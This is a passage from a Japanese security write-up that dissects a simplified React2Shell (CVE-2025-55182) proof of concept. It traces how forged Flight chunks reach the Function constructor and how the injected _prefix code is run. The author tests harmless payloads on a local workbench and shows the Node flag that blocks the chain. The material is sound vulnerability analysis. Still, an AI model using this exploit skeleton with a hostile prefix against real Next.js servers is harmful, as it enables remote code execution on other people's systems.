この `resolve(chunk.value)` に `{ then: generatedFunction }` が渡るため、
ここから先は JavaScript の Promise 解決ルールにより
`generatedFunction(resolve2, reject2)` が呼ばれます。

```text
resolve1({ then: generatedFunction })
  ↓
Promise sees thenable
  ↓
generatedFunction(resolve2, reject2)
```

**ここが本当の発火点です。**

今回の harmless 版では、generated function 本体は次のどちらかになります。

```js
console.log("[original-shape-safe-log]", JSON.stringify({
  arg0Type: typeof arguments[0],
  arg1Type: typeof arguments[1],
  processType: typeof process,
}))//NaN
```

または

```js
arguments[0](["trace-original-poc","from-safe-prefix"])//NaN
```

前者ならサーバログが出ます。
後者なら `arguments[0]`、つまり `resolve2` が呼ばれ、
最終的に Server Action 側へ harmless な値が渡ります。

したがって、第4段階は
「React が直接 `generatedFunction(...)` を呼ぶ段階」というより、
「React が `resolve(chunk.value)` を返した結果、
**JS 標準の thenable assimilation が generated function を呼ぶ段階**」
と言った方が正確です。

今回の簡略 PoC でも結論は同じです。

- `"$@0"` は raw chunk 参照の足場
- `"$B"` は generated function を返す足場
- critical な実行は generated function が `then(resolve, reject)` として呼ばれた瞬間

# 関数呼び出しパスを具体値つきで追う

ここまでを、できるだけ具体的な値を添えて一本の流れにすると次のようになります。

```text
1. decodeReplyFromBusboy(busboy, ...)
   -> realResponse を作る
   -> return rootChunk0

2. await rootChunk0
   -> rootChunk0.then(resolve0, reject0)

3. field "0" 到着
   -> rootChunk0.status = "resolved_model"
   -> rootChunk0.value = "{\"status\":\"resolved_model\",...}"
   -> initializeModelChunk(rootChunk0)

4. rootChunk0 の revive 中
   -> field "1" は "$@0"
   -> chunk1.value = raw rootChunk0
   -> "$1:then" = Chunk.prototype.then
   -> "$1:then:constructor" = Function
   -> rootChunk0.value = forgedChunk

5. Promise が forgedChunk を thenable として扱う
   -> forgedChunk.then(resolve1, reject1)
   -> Chunk.prototype.then.call(forgedChunk, resolve1, reject1)

6. forgedChunk の revive
   -> forgedChunk.value = "{\"then\":\"$B\"}"
   -> parseModelString("$B")
   -> id = NaN
   -> forgedChunk._formData.get(forgedChunk._prefix + "NaN")
   -> Function(harmlessPrefix + "NaN")
   -> forgedChunk.value = { then: generatedFunction }

7. Promise が { then: generatedFunction } を thenable として扱う
   -> generatedFunction(resolve2, reject2)
   -> generated function 本体が動く
```

この流れを見ると、今回の PoC は前稿の PoC より短いですが、
構造自体はかなり素直です。
1 回目の revive で `Chunk.prototype.then` と `Function` の両方を準備し、
2 回目の revive で `"$B"` から generated function を作り、
最後にそれが thenable assimilation で呼ばれます。

# 動的解析で確認したこと

今回の動的解析は、すべてローカルの脆弱版 workbench に対して行いました。
本番環境への試行はしていません。

まず比較用に baseline を送り、
通常の `encodeReply(...)` で生成した payload が
HTTP `200` で `baseline-label` / `baseline-payload` を返すことを確認しました。
これにより、以後の観測が workbench 自体の不具合ではないことを確かめました。

そのうえで、今回の簡略 PoC 形状そのものを保ったまま、
`_prefix` だけを harmless な文字列に差し替えて検証しました。
使った形は次の 2 種類です。

1. `log-only` 版  
   `_prefix = 'console.log("[original-shape-safe-log]", JSON.stringify({arg0Type: typeof arguments[0], arg1Type: typeof arguments[1], processType: typeof process}))//'`
2. `resolve` 版  
   `_prefix = 'arguments[0](["trace-original-poc","from-safe-prefix"])//'`

## `log-only` 版で確認したこと

`log-only` 版では、HTTP クライアント側はタイムアウトしました。
これは generated function 本体が `console.log(...)` だけを行い、
`resolve` も `reject` も呼ばないためです。

しかしサーバログには次が出ました。

```text
[original-shape-safe-log] {"arg0Type":"function","arg1Type":"function","processType":"object"}
```

これは、generated function 本体が実際に呼ばれ、
その呼び出し形が `then(resolve, reject)` であり、
かつ Node.js の `process` を見られる文脈だったことを示しています。

## `resolve` 版で確認したこと

`resolve` 版では、同じ PoC 骨格のまま
generated function 本体から
`arguments[0](["trace-original-poc","from-safe-prefix"])` を呼ぶようにしました。

このときは HTTP `200` が返り、RSC 応答には次が含まれました。

```text
label = "trace-original-poc"
head = "from-safe-prefix"
```

さらにサーバログでも `trace-original-poc` が観測できました。
したがって、今回の PoC 形状でも

1. `"$1:then"` により borrowed `Chunk.prototype.then` が埋め込まれる
2. `"$1:then:constructor"` により `Function` が埋め込まれる
3. `"$B"` により generated function が返る
4. その generated function が `then(resolve, reject)` として本当に呼ばれる

という連鎖が安全側 payload で成立することを確認できました。

## `--disallow-code-generation-from-strings` で確認したこと

追加で、Node.js の `--disallow-code-generation-from-strings` を有効にした場合に、
この簡略 PoC が止まるかも確認しました。

まず Node.js 単体では、期待どおり `Function("return 1")` が
次の `EvalError` で拒否されました。

```text
EvalError: Code generation from strings disallowed for this context
```

次に、同じオプションを Next.js workbench のサーバプロセス全体へ
`NODE_OPTIONS=--disallow-code-generation-from-strings` として付けて起動しようとしました。
しかし、この環境では PoC 到達前に Next.js 側の内部 `eval(...)` で起動自体が失敗しました。

```text
EvalError: Code generation from strings disallowed for this context
    at requireWithFakeGlobalScope (.../@edge-runtime/primitives/load.js:18700:8)
```

したがって、今回の workbench では
「Next.js 実サーバをそのままこのオプション付きで起動し、HTTP POST で PoC を叩く」
形の検証はできませんでした。
これは PoC が通ったという意味ではなく、
アプリケーション runtime 側がこの Node オプションに耐えられず、
**より手前で止まった**という意味です。

そこで切り分けとして、React Server DOM の `decodeReply(...)` を
`--conditions react-server` 付きで直接呼び、
同じ FormData payload を decoder に渡しました。

フラグなしでは、`resolve` 版 payload は次のように decode され、
generated function が実際に呼ばれて `resolve` まで到達しました。

```json
{
  "ok": true,
  "decoded": ["trace-direct-poc", "from-safe-prefix"]
}
```

一方、`--disallow-code-generation-from-strings` 付きでは、
同じ payload が `EvalError` で失敗しました。
stack 上の失敗位置は `parseModelString` 内の
`response._formData.get(blobKey)` であり、
ここで forged `_formData.get` が `Function` になっているため、
実質的には `Function(response._prefix + "NaN")` が拒否されたと読めます。

```json
{
  "ok": false,
  "name": "EvalError",
  "message": "Code generation from strings disallowed for this context",
  "stackHead": [
    "EvalError: Code generation from strings disallowed for this context",
    "    at Object.Function [as get] (<anonymous>)",
    "    at parseModelString (...react-server-dom-webpack-server.node.development.js:4648:34)",
    "    at reviveModel (...react-server-dom-webpack-server.node.development.js:4159:16)"
  ]
}
```

`log-only` 版でも同じ傾向でした。
フラグなしでは generated function 本体のログが出ましたが、
フラグありでは本体実行前に同じ `EvalError` で止まりました。

この結果から、少なくとも今回検証した簡略 PoC については、
`--disallow-code-generation-from-strings` により、
第3段階の `Function(...)` による generated function 生成が拒否され、
第4段階の generated function 呼び出しまで進まないことを確認できました。

ただし、これは React2Shell の根本原因が消えるという意味ではありません。
止まったのは、今回の PoC が `"$1:then:constructor"` から `Function` constructor に到達し、
文字列から generated function を作る攻撃チェーンだからです。
Flight payload の不安全な解釈そのものは残るため、
**このオプションは根本対策ではなく defense-in-depth として扱うべき**です。

## 動的解析から分かった精度の高い言い方

今回の PoC について、精度を上げて言うなら次の 2 点が重要です。

1. `"$@0"` は raw chunk 参照の足場であり、
   それ自体が critical な `then` 呼び出しを起こすわけではありません。
2. `"$B"` も即実行 primitive ではなく、generated function を返すだけです。
   本体が動くのは、その generated function が後段の thenable assimilation で
   呼ばれた瞬間です。

今回の簡略版 PoC は前稿より短い形になっていますが、
この 2 点はまったく変わりません。

# まとめ

今回の簡略版 PoC は、前稿の PoC より短いぶん、
かえって**本質が見えやすい**形になっていました。

`"$@0"` により raw chunk `0` を取り出し、
`"$1:then"` で `Chunk.prototype.then` を得ます。
さらに `"$1:then:constructor"` により `Function` を得ます。
2 回目の revive で `"$B"` が `Function(_prefix + "NaN")` 相当の
generated function を返し、
最後にその generated function が `then(resolve, reject)` として呼ばれます。

したがって、この PoC の本質はやはり
「**特殊構文ひとつが直接 RCE を起こす**」ことではありません。
React Flight の revive と JavaScript の thenable assimilation が
交互に噛み合うことで、
データとして送られた値が最終的に実行される `then` へ昇格してしまうことが本質です。

ここまで読んでいただきありがとうございました！
前稿と合わせて読むと、PoC の変形がいかに本質を変えずに短縮されているかが
より鮮明に見えてくると思います。

# 参考文献

- React 公式ドキュメント: Server Components  
  https://react.dev/reference/rsc/server-components
- React 公式ドキュメント: `'use server'` / Server Functions  
  https://react.dev/reference/rsc/use-server
- Next.js 公式ドキュメント: Mutating Data / Server Functions and Server Actions  
  https://nextjs.org/docs/app/getting-started/mutating-data
- Next.js 公式ドキュメント: Forms  
  https://nextjs.org/docs/app/guides/forms
- Busboy README  
  https://github.com/mscdex/busboy
- RFC 7578: `multipart/form-data`  
  https://www.rfc-editor.org/rfc/rfc7578
- MDN: `Function()` constructor  
  https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/Function
- MDN: Promise resolution and thenables  
  https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise/Promise
- MDN: `Promise.prototype.then()`  
  https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise/then
- React source: `decodeReplyFromBusboy`  
  https://github.com/facebook/react/blob/6de32a5a07958d7fc2f8d0785f5873d2da73b9fa/packages/react-server-dom-webpack/src/server/ReactFlightDOMServerNode.js
- React source: `createResponse`, `getChunk`, `resolveField`, `resolveModelChunk`, `initializeModelChunk`, `parseModelString`  
  https://github.com/facebook/react/blob/6de32a5a07958d7fc2f8d0785f5873d2da73b9fa/packages/react-server/src/ReactFlightReplyServer.js
- Next.js source: action handler  
  https://github.com/vercel/next.js/blob/c09c5f9e278e46b0923c96ef5cf8a6bd9edbaf80/packages/next/src/server/app-render/action-handler.ts
- maple3142 氏による発端の PoC コード  
  https://gist.github.com/maple3142/48bc9393f45e068cf8c90ab865c0f5f3
- msanft 氏による PoC の解説リポジトリ  
  https://github.com/msanft/CVE-2025-55182/
- Guillermo Rauch 氏による脆弱性報告ポスト  
  https://x.com/rauchg/article/1997362942929440937
- Lachlan Davidson 氏による報告時の PoC リポジトリ  
  https://github.com/lachlan2k/React2Shell-CVE-2025-55182-original-poc
